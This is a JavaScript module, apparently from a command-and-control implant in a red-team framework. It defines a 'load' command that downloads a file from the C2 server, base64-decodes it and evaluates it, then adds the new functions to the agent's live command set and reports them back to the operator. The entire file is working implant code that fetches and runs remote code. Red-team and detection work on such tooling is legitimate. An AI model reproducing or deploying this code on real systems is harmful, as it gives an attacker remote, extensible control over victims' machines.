exports.load = function(task, command, params){
    //base64 decode the params and pass it to the default_load command
    //  params should be {"cmds": "cmd1 cmd2 cmd3", "file_id": #}
    try{
        let parsed_params = JSON.parse(params);
        let code = C2.upload(task, parsed_params['file_id'], "");
        if(typeof code === "string"){
            return {"user_output":String(code), "completed": true, "status": "error"};
            //something failed, we should have NSData type back
        }
        let new_dict = default_load(base64_decode(code));
        commands_dict = Object.assign({}, commands_dict, new_dict);
        // update the config with our new information
        C2.commands = Object.keys(commands_dict);
        let cmd_list = [];
        for(let i = 0; i < parsed_params['commands'].length; i++){
            cmd_list.push({"action": "add", "cmd": parsed_params['commands'][i]})
        }
        return {"user_output": "Loaded " + parsed_params['commands'], "commands": cmd_list, "completed": true};
    }
    catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
};
